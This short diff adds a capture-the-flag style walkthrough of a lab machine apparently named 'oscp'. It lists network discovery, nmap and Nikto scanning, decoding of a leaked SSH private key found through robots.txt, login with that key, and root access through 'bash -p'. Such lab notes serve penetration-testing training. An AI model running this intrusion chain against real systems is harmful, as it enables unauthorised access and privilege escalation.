@@ -1,0 +1,30 @@
+* netdiscover
+  - This found the IP of the box
+  
+* nmap <IP>
+  - ports 80 and 22 are open
+  
+* Nikto -h <IP>
+  - FOUND /robots.txt
+     > secret.txt
+  - FOUND /wp-content/plugins/akismet/readme.txt
+  - FOUND /wp-links-opml.php
+  - FOUND /wp-login.php -> wordpress login
+  
+* <IP>/wp-links-opml.php
+  - FOUND Wordpress to be running version 5.4.2
+  
+* secret.txt
+  - echo " <long text file> " | base64 -d
+    > FOUND this is the openssh private key
+
+* vim deployment_key.txt 
+  - paste in the key form the secret.txt
+
+* chmod 600 deployment_key.txt
+
+* ssh -i deplyment_key.txt oscp@<IP>
+  - user accesses into the machine (still need root)
+  
+* bash -p 
+  - in as root 
